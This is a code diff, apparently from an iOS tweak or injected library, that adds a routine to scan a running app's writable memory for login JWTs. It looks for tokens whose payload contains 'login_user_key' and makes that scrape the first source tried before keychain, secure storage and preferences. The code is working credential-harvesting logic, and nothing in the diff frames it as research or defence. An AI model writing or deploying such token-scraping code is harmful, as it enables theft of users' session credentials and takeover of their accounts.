@@ -1,5 +1,4 @@
 #import "SLHttp.h"
-#import "SLCacheDB.h"
 #import <mach/mach.h>
 #import <mach/vm_region.h>
 #import <string.h>
@@ -175,15 +174,84 @@ static NSString *g_host = nil;
     return nil;
 }
 
+
+#pragma mark - 从进程内存里找 App 自己的 token
+
+static BOOL SLIsB64Char(unsigned char c) {
+    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+           (c >= '0' && c <= '9') || c == '-' || c == '_';
+}
+
++ (NSString *)tokenFromMemory {
+    mach_port_t task = mach_task_self();
+    vm_address_t addr = 0;
+    NSString *best = nil;
+    NSUInteger scanned = 0;
+    while (scanned < (512u << 20)) {
+        vm_size_t size = 0;
+        natural_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+        kern_return_t kr = vm_region_recurse_64(task, &addr, &size, &depth,
+                                                (vm_region_info_64_t)&info, &cnt);
+        if (kr != KERN_SUCCESS || !size) break;
+        if (info.is_submap) { depth++; continue; }
+        if ((info.protection & VM_PROT_WRITE) && size > 1000 && size <= (64u << 20)) {
+            char *buf = malloc(size);
+            if (buf) {
+                vm_size_t out = 0;
+                if (vm_read_overwrite(task, addr, size, (vm_address_t)buf, &out) == KERN_SUCCESS) {
+                    scanned += size;
+                    NSUInteger n = out;
+                    for (NSUInteger i = 0; i + 3 < n; i++) {
+                        if (!(buf[i] == 'e' && buf[i+1] == 'y' && buf[i+2] == 'J')) continue;
+                        NSUInteger j = i;
+                        while (j < n && (SLIsB64Char((unsigned char)buf[j]) || buf[j] == '.')) j++;
+                        NSUInteger len = j - i;
+                        if (len < 100 || len > 4000) { continue; }
+                        int dots = 0;
+                        NSUInteger d1 = 0, d2 = 0;
+                        for (NSUInteger k = i; k < j; k++) {
+                            if (buf[k] == '.') { if (!dots) d1 = k; else d2 = k; dots++; }
+                        }
+                        if (dots != 2 || !d2) continue;
+                        NSString *payload = [[NSString alloc] initWithBytes:buf + d1 + 1
+                                                                     length:d2 - d1 - 1
+                                                                   encoding:NSUTF8StringEncoding];
+                        if (!payload.length) continue;
+                        NSData *pd = [[NSData alloc] initWithBase64EncodedString:
+                                      [payload stringByPaddingToLength:((payload.length + 3) / 4) * 4
+                                                            withString:@"=" startingAtIndex:0]
+                                                                        options:0];
+                        if (!pd) continue;
+                        NSString *pj = [[NSString alloc] initWithData:pd encoding:NSUTF8StringEncoding];
+                        if (![pj containsString:@"login_user_key"]) continue;
+                        NSString *tok = [[NSString alloc] initWithBytes:buf + i length:len encoding:NSUTF8StringEncoding];
+                        if (tok.length && (!best.length || tok.length > best.length)) best = tok;
+                        i = j;
+                    }
+                }
+                free(buf);
+            }
+        }
+        addr += size;
+    }
+    if (best) SLLog(@"token from memory len=%lu scanned=%luMB", (unsigned long)best.length, (unsigned long)(scanned >> 20));
+    return best;
+}
+
 + (NSString *)currentToken {
-    NSString *t = [self tokenFromSecureStorage];
+    NSString *t = [self tokenFromMemory];
+    if (!t) t = [self tokenFromSecureStorage];
     if (!t) t = [self tokenFromItems:[self keychainItems] differentFrom:nil];
     if (!t) t = [self tokenInPrefsDifferentFrom:nil];
     if (!t) SLLog(@"no token found (all sources)");
     return t;
 }
 + (NSString *)newTokenDifferentFrom:(NSString *)old {
-    NSString *t = [self tokenFromSecureStorage];
+    NSString *t = [self tokenFromMemory];
+    if (t && old.length && [t isEqualToString:old]) t = nil;
+    if (!t) t = [self tokenFromSecureStorage];
     if (t && (!old.length || ![t isEqualToString:old])) return t;
     t = [self tokenFromItems:[self keychainItems] differentFrom:old];
     return t ?: [self tokenInPrefsDifferentFrom:old];
